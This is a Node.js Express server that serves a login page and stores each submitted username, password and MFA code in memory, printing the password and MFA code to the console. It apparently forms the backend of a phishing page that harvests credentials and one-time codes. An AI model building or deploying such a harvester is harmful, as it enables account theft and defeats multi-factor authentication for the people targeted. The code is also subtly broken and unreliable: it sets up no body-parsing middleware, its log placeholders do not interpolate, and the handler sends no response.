const express = require("express")
const app = express();

app.use(express.static("public"));

const hostname = '127.0.0.1';
const port = 3010;

var accounts = []

// https://expressjs.com/en/starter/basic-routing.html
app.get("/", (request, response) => {
  response.sendFile(__dirname + "/views/login.html");
});

/*
Login Handlers
*/
app.post("/submit", (req, res) => {
  var username = req.body.username;
  var password = req.body.password;
  var mfa = req.body.mfa;

  console.log("Received input...");

  var found = false;
  var foundIndex = 0;
  for (index = 0; index < accounts.length && found === false; index++) {
    if(accounts[index].username === username) {
      found = true;
      foundIndex = index;
    }
  }
  if (found) {
    console.log("Found existing account... updating entry...");
    accounts[foundIndex].password = password;
    accounts[foundIndex].mfa = mfa;
    // check if all fields set and print out if true
    if (password !== "") {
      console.log("---------------------")
      console.log("Username: ${username}\nPassword: ${password}\nMFA: ${mfa}")
      console.log("---------------------\n")
    }
  }
  else {
    console.log("Creating new account entry...");
    var newAccount = {
      username: username,
      password: password,
      mfa: mfa
    }
    accounts.push(newAccount)
  }
});


// listen for requests
const listener = app.listen(port, () => {
  console.log("Your app is listening on port " + listener.address().port);
});
